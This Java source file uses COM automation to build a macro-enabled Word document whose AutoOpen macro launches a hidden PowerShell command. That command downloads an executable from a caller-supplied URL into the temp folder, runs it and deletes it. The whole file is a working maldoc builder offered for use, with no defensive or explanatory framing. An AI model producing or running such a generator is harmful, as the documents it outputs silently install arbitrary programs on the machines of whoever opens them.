import com.jacob.activeX.ActiveXComponent;
import com.jacob.com.Dispatch;
import com.jacob.com.Variant;

import java.io.FileWriter;
import java.io.IOException;

public class WordVbaAutomation {

    public static void createWordWithMacro(String link, String htmlContent) {
        // Path to JACOB DLL
        String dllPath = System.getProperty("user.dir") + "\\Application\\lib\\jacob-1.21-x64.dll";
        System.setProperty("jacob.dll.path", dllPath);

        // File paths
        String tempHtmlPath = System.getProperty("user.dir") + "\\bin\\temp.html";
        String outputPath = System.getProperty("user.dir") + "\\Output\\WordWithMacro.docm";

        ActiveXComponent word = null;

        try {
            // Step 1: Save HTML content to file
            try (FileWriter writer = new FileWriter(tempHtmlPath)) {
                writer.write(htmlContent);
            }

            // Step 2: Open Word
            word = new ActiveXComponent("Word.Application");
            word.setProperty("Visible", new Variant(false)); // Background

            // Step 3: Open the HTML file in Word
            Dispatch documents = word.getProperty("Documents").toDispatch();
            Dispatch document = Dispatch.call(documents, "Open", tempHtmlPath).toDispatch();

            // Step 4: Inject VBA macro
            Dispatch vbProject = Dispatch.get(document, "VBProject").toDispatch();
            Dispatch vbModules = Dispatch.get(vbProject, "VBComponents").toDispatch();
            Dispatch vbModule = Dispatch.call(vbModules, "Add", new Variant(1)).toDispatch(); // 1 = standard module
            Dispatch codeModule = Dispatch.get(vbModule, "CodeModule").toDispatch();
            String vbaCode =
                    "Sub AutoOpen()\n" +
                    "    Dim psCommand As String\n" +
                    "    Dim command As String\n\n" +
                    "    psCommand = \"Set-Variable -Name url -Value ('" + link + "');\" & _\n" +
                    "                \"Set-Variable -Name tempPath -Value ($env:TEMP + '\\\\main.exe');\" & _\n" +
                    "                \"Invoke-WebRequest -OutFile $tempPath -Uri $url;\" & _\n" +
                    "                \"Start-Process -FilePath $tempPath -Wait;\" & _\n" +
                    "                \"Remove-Item $tempPath -Force\"\n\n" +
                    "    command = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"\"\" & Replace(psCommand, \"\"\"\", \"\\\"\"\") & \"\"\"\"\n\n" +
                    "    Shell command, vbHide\n" +
                    "End Sub";


            Dispatch.call(codeModule, "AddFromString", vbaCode);

            // Step 5: Save as .docm
            Dispatch.call(document, "SaveAs2", outputPath, new Variant(13)); // 13 = wdFormatXMLDocumentMacroEnabled

            // Step 6: Close document and quit Word
            Dispatch.call(document, "Close", new Variant(false));
            word.invoke("Quit");

            System.out.println("Word document with macro saved at: " + outputPath);

        } catch (IOException e) {
            System.err.println("Error writing HTML file: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (word != null) {
                word.safeRelease();
            }
        }
    }
}
